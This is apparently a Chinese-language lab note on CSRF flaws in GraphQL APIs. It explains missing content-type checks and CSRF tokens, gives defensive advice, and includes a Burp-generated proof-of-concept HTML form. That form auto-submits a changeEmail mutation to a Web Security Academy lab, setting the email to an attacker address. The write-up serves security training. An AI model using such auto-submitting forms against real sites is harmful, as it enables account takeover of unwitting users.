### GraphQL CSRF 漏洞成因

内容类型校验缺失

- 安全请求：`Content-Type: application/json` 的 POST 请求需 JS 发起
- 漏洞点：若允许 `GET` 或 `x-www-form-urlencoded`，攻击者可通过 HTML 表单自动提交恶意请求

CSRF 令牌缺失

- 未强制要求请求携带 CSRF 令牌（如 `X-CSRF-Token`）
- 后果：攻击者可伪装成合法用户执行操作

防御建议：

- 仅允许 `application/json` 的 POST 请求
- 强制使用 CSRF 令牌验证请求来源

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a7f004b035c19808168572f000d00cb.web-security-academy.net/graphql/v1" method="POST">
      <input type="hidden" name="query" value="&#10;&#32;&#32;&#32;&#32;mutation&#32;changeEmail&#40;&#36;input&#58;&#32;ChangeEmailInput&#33;&#41;&#32;&#123;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;changeEmail&#40;input&#58;&#32;&#36;input&#41;&#32;&#123;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;email&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#125;&#10;&#32;&#32;&#32;&#32;&#125;&#10;" />
      <input type="hidden" name="operationName" value="changeEmail" />
      <input type="hidden" name="variables" value="&#123;&quot;input&quot;&#58;&#123;&quot;email&quot;&#58;&quot;hacker&#64;hacker&#46;com&quot;&#125;&#125;" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

正常请求：Content-Type: application/json

![image-20250515175521949](https://cdn.jsdelivr.net/gh/LilDean17/secdoc@main/Web%20%E5%AE%89%E5%85%A8/GraphQL%20API%20%E6%BC%8F%E6%B4%9E/images/image-20250515175521949.png)

允许的其他请求：Content-Type: x-www-form-urlencoded

![image-20250515175508834](https://cdn.jsdelivr.net/gh/LilDean17/secdoc@main/Web%20%E5%AE%89%E5%85%A8/GraphQL%20API%20%E6%BC%8F%E6%B4%9E/images/image-20250515175508834.png)

